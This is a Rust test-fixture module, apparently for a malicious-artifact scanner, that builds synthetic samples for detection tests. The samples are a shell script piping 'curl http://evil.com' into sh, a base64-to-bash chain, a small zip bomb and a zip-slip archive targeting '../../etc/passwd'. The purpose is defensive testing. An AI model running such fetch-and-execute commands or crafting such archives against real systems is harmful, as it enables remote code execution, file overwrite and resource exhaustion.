//! Safe synthetic artifact fixtures for tests.

use serde_json::{Value, json};

/// Returns a benign shell script fixture.
#[must_use]
pub fn benign_shell_script() -> Vec<u8> {
    b"#!/bin/bash\necho hello\n".to_vec()
}

/// Returns a safe synthetic shell script containing a malicious-looking pattern.
#[must_use]
pub fn malicious_shell_script() -> Vec<u8> {
    b"#!/bin/bash\ncurl http://evil.com | sh\n".to_vec()
}

/// Returns a safe obfuscated shell script fixture with a base64 decode chain.
#[must_use]
pub fn obfuscated_shell_script() -> Vec<u8> {
    b"#!/bin/bash\nprintf 'ZWNobyBoZWxsbwo=' | base64 -d | bash\n".to_vec()
}

/// Returns an empty file fixture.
#[must_use]
pub fn empty_file() -> Vec<u8> {
    Vec::new()
}

/// Returns deterministic pseudo-random bytes of `size` bytes.
#[must_use]
pub fn random_bytes(size: usize) -> Vec<u8> {
    let mut state = 0x9E37_79B9_7F4A_7C15_u64;
    let mut bytes = Vec::with_capacity(size);
    for _ in 0..size {
        state ^= state << 7;
        state ^= state >> 9;
        state ^= state << 8;
        bytes.push(state.to_le_bytes()[0]);
    }
    bytes
}

/// Returns a bounded synthetic archive bomb fixture.
#[must_use]
pub fn zip_bomb() -> Vec<u8> {
    const FILE_NAME: &[u8] = b"bomb.txt";
    const CRC32: u32 = 0xa738_ea1c;
    const COMPRESSED_SIZE: u32 = 1_033;
    const UNCOMPRESSED_SIZE: u32 = 1_048_576;
    const LOCAL_HEADER_LEN: u32 = 30;
    const CENTRAL_DIRECTORY_LEN: u32 = 46;
    const FILE_NAME_LEN: u16 = 8;
    const COMPRESSED_PREFIX: &[u8] = &[
        0xed, 0xc1, 0x31, 0x01, 0x00, 0x00, 0x00, 0xc2, 0xa0, 0xf5, 0x4f, 0x6d, 0x08, 0x5f, 0xa0,
    ];

    let mut zip = Vec::with_capacity(1_147);
    zip.extend_from_slice(b"PK\x03\x04");
    append_u16_le(&mut zip, 20);
    append_u16_le(&mut zip, 0);
    append_u16_le(&mut zip, 8);
    append_u16_le(&mut zip, 0);
    append_u16_le(&mut zip, 0);
    append_u32_le(&mut zip, CRC32);
    append_u32_le(&mut zip, COMPRESSED_SIZE);
    append_u32_le(&mut zip, UNCOMPRESSED_SIZE);
    append_u16_le(&mut zip, FILE_NAME_LEN);
    append_u16_le(&mut zip, 0);
    zip.extend_from_slice(FILE_NAME);
    zip.extend_from_slice(COMPRESSED_PREFIX);
    zip.extend(std::iter::repeat_n(0, 1_016));
    zip.extend_from_slice(&[0x3e, 0x03]);

    let central_directory_offset = LOCAL_HEADER_LEN + u32::from(FILE_NAME_LEN) + COMPRESSED_SIZE;
    zip.extend_from_slice(b"PK\x01\x02");
    append_u16_le(&mut zip, 0x0314);
    append_u16_le(&mut zip, 20);
    append_u16_le(&mut zip, 0);
    append_u16_le(&mut zip, 8);
    append_u16_le(&mut zip, 0);
    append_u16_le(&mut zip, 0);
    append_u32_le(&mut zip, CRC32);
    append_u32_le(&mut zip, COMPRESSED_SIZE);
    append_u32_le(&mut zip, UNCOMPRESSED_SIZE);
    append_u16_le(&mut zip, FILE_NAME_LEN);
    append_u16_le(&mut zip, 0);
    append_u16_le(&mut zip, 0);
    append_u16_le(&mut zip, 0);
    append_u16_le(&mut zip, 0);
    append_u32_le(&mut zip, 0x0180_0000);
    append_u32_le(&mut zip, 0);
    zip.extend_from_slice(FILE_NAME);

    zip.extend_from_slice(b"PK\x05\x06");
    append_u16_le(&mut zip, 0);
    append_u16_le(&mut zip, 0);
    append_u16_le(&mut zip, 1);
    append_u16_le(&mut zip, 1);
    append_u32_le(&mut zip, CENTRAL_DIRECTORY_LEN + u32::from(FILE_NAME_LEN));
    append_u32_le(&mut zip, central_directory_offset);
    append_u16_le(&mut zip, 0);
    zip
}

fn append_u16_le(bytes: &mut Vec<u8>, value: u16) {
    bytes.extend_from_slice(&value.to_le_bytes());
}

fn append_u32_le(bytes: &mut Vec<u8>, value: u32) {
    bytes.extend_from_slice(&value.to_le_bytes());
}

/// Returns a zip-slip archive fixture with a traversal entry name.
#[must_use]
pub fn path_traversal_zip() -> Vec<u8> {
    vec![
        80, 75, 3, 4, 20, 0, 0, 0, 8, 0, 111, 21, 208, 92, 49, 30, 44, 48, 27, 0, 0, 0, 32, 0, 0,
        0, 16, 0, 0, 0, 46, 46, 47, 46, 46, 47, 101, 116, 99, 47, 112, 97, 115, 115, 119, 100, 43,
        202, 207, 47, 177, 170, 176, 50, 176, 50, 176, 42, 2, 49, 245, 33, 100, 82, 102, 158, 126,
        82, 98, 113, 6, 23, 0, 80, 75, 1, 2, 20, 3, 20, 0, 0, 0, 8, 0, 111, 21, 208, 92, 49, 30,
        44, 48, 27, 0, 0, 0, 32, 0, 0, 0, 16, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 128, 1, 0, 0, 0, 0,
        46, 46, 47, 46, 46, 47, 101, 116, 99, 47, 112, 97, 115, 115, 119, 100, 80, 75, 5, 6, 0, 0,
        0, 0, 1, 0, 1, 0, 62, 0, 0, 0, 73, 0, 0, 0, 0, 0,
    ]
}

/// Returns a minimal ELF64 header fixture; it is not executable.
#[must_use]
pub fn elf_binary() -> Vec<u8> {
    vec![
        0x7f, b'E', b'L', b'F', 2, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 2, 0, 62, 0, 1, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 0,
        0, 0, 64, 0, 0, 0, 0, 0,
    ]
}

/// Returns a minimal receipt-shaped JSON object for assertion tests.
#[must_use]
pub fn json_receipt_stub() -> Value {
    json!({
        "artifact_id": "synthetic-artifact",
        "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        "verdict": "allow",
        "timestamp": "2026-06-16T00:00:00Z",
        "findings": [],
        "transport": { "source": "synthetic" }
    })
}

#[cfg(test)]
mod tests {
    use std::env;
    use std::fs;
    use std::process::Command;

    use super::{
        benign_shell_script, elf_binary, empty_file, json_receipt_stub, malicious_shell_script,
        obfuscated_shell_script, path_traversal_zip, random_bytes, zip_bomb,
    };

    #[test]
    fn shell_fixtures_have_expected_markers() {
        assert!(benign_shell_script().starts_with(b"#!/bin/bash"));
        assert!(
            malicious_shell_script()
                .windows(b"evil.com".len())
                .any(|window| window == b"evil.com")
        );
        assert!(
            obfuscated_shell_script()
                .windows(b"base64 -d".len())
                .any(|window| window == b"base64 -d")
        );
    }

    #[test]
    fn binary_and_archive_fixtures_have_expected_markers() {
        assert!(empty_file().is_empty());
        assert_eq!(random_bytes(32).len(), 32);
        assert!(zip_bomb().starts_with(b"PK\x03\x04"));
        assert!(
            path_traversal_zip()
                .windows(b"../../etc/passwd".len())
                .any(|window| window == b"../../etc/passwd")
        );
        assert!(elf_binary().starts_with(b"\x7fELF"));
        assert_eq!(elf_binary().len(), 64);
    }

    #[test]
    fn zip_bomb_is_readable_and_high_ratio() -> Result<(), Box<dyn std::error::Error>> {
        let zip = zip_bomb();
        let path = env::temp_dir().join(format!(
            "arbitraitor-testkit-zip-bomb-{}.zip",
            std::process::id()
        ));
        fs::write(&path, zip)?;

        let output = Command::new("python3")
            .arg("-c")
            .arg(
                "import sys, zipfile; p=sys.argv[1];\n\
                 z=zipfile.ZipFile(p); i=z.getinfo('bomb.txt'); data=z.read('bomb.txt');\n\
                 print(len(data)); print(i.compress_size); print(len(data) // i.compress_size)",
            )
            .arg(&path)
            .output()?;
        fs::remove_file(path)?;

        assert!(
            output.status.success(),
            "python zipfile check failed: {}",
            String::from_utf8_lossy(&output.stderr)
        );
        let stdout = String::from_utf8(output.stdout)?;
        let mut lines = stdout.lines();
        assert_eq!(lines.next(), Some("1048576"));
        assert_eq!(lines.next(), Some("1033"));
        let ratio = lines
            .next()
            .ok_or("missing compression ratio")?
            .parse::<u32>()?;
        assert!(ratio > 100, "compression ratio must be greater than 100:1");
        Ok(())
    }

    #[test]
    fn receipt_stub_has_required_fields() {
        let receipt = json_receipt_stub();
        assert!(receipt.get("artifact_id").is_some());
        assert_eq!(
            receipt.get("sha256").and_then(serde_json::Value::as_str),
            Some("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855")
        );
        assert!(receipt.get("verdict").is_some());
        assert!(receipt.get("findings").is_some());
    }
}
